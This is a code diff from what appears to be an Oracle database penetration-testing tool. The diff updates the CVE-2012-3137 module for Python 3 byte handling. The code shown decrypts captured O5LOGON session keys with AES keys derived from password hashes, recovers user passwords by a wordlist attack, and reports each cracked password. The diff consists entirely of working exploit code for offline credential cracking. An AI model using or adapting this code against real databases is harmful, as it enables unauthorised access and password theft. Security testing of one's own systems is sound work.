@@ -155,8 +155,8 @@ class CVE_2012_3137 ():
 		'''
 		'''
 		pass_hash = hashlib.sha1(password+salt)
-		key = pass_hash.digest() + '\x00\x00\x00\x00'
-		decryptor = AES.new(key,AES.MODE_CBC,'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+		key = pass_hash.digest() + b'\x00\x00\x00\x00'
+		decryptor = AES.new(key,AES.MODE_CBC,b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
 		plain = decryptor.decrypt(session)
 		return plain
 
@@ -194,8 +194,8 @@ class CVE_2012_3137 ():
 						nb +=1
 						pbar.update(nb)
 						password = password.replace('\n','').replace('\t','')
-						session_id = self.__decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
-						if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
+						session_id = self.__decryptKey__(bytes.fromhex(session_hex),  bytes.fromhex(salt_hex), password.encode('utf-8'))
+						if session_id[40:] == b'\x08\x08\x08\x08\x08\x08\x08\x08':
 							self.passwdFound.append([user,password])
 							self.args['print'].goodNews("{0} password:{1}".format(user,password))
 							fpasswd.close()
@@ -218,8 +218,8 @@ class CVE_2012_3137 ():
 		self.getAPassword(user)
 		logging.info("The challenge captured for the user {0}: key='{1}', salt='{2}'".format(user, sessionKey, salt))
 		if sessionKey != '' and salt != '' and sessionKey != [] and salt != []:
-			session_id = self.__decryptKey__(sessionKey.decode('hex'),salt.decode('hex'),password)
-			if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
+			session_id = self.__decryptKey__(bytes.fromhex(sessionKey), bytes.fromhex(salt), password.encode('utf-8'))
+			if session_id[40:] == b'\x08\x08\x08\x08\x08\x08\x08\x08':
 				logging.info ("The database is vulnerable! Indeed, the result is good when you use the password '{0}' to decrypt the key '{1}' of the user {2} with the salt '{3}'".format(password, sessionKey, user, salt))
 				return True
 			else:
